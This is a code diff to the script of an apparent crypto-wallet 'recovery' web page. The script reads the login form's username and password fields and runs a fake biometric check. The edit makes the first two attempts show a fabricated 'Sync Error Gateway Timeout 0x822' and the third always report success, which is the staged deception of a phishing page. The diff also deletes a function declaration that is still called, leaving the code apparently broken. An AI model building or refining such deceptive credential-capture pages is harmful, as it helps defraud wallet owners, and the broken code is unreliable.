@@ -329,9 +329,6 @@
             runBiometricSequence();
         } else {
           
-    // ==========================================================
-    // WALLET RECOVERY AND BIOMETRIC LOGIC (PURE ENGLISH)
-    // ==========================================================
     let biometricRetryCount = 0; 
 
     function handleWalletRecovery(event) {
@@ -341,7 +338,7 @@
         const passInputField = document.querySelector('.auth-card input[type="password"]');
         
         if (!userInputField || !passInputField) {
-          alert("Sync Error Gateway Timeout 0x822")
+            alert("Sync Error Gateway Timeout 0x822");
             return;
         }
 
@@ -367,22 +364,15 @@
         const loader = document.querySelector('.loader-ring');
         if (loader) loader.style.display = 'inline-block'; 
 
-        }
-    }
-
-    function runBiometricSequence() {
-        const loader = document.querySelector('.loader-ring');
-        if (loader) loader.style.display = 'inline-block'; 
-
         setTimeout(() => {
             biometricRetryCount++; 
 
             if (biometricRetryCount < 3) {
-                // Attempt 1 and 2: English failure pop-up
-                alert(`Biometric verification failed. Please try again. (Attempt: ${biometricRetryCount}/2)`);
+                // Unang dalawang subok: Lalabas ang eksaktong timeout error na ito
+                alert("Sync Error Gateway Timeout 0x822");
                 if (loader) loader.style.display = 'none'; 
             } else {
-                // Attempt 3: English success pop-up and redirects to dashboard
+                // Ikatlong subok: Tagumpay at magbubukas ang wallet dashboard mo
                 alert("Biometric Verified Successfully!");
                 if (loader) loader.style.display = 'none';
 
@@ -397,3 +387,4 @@
 </script>
 </body>
 </html>
+
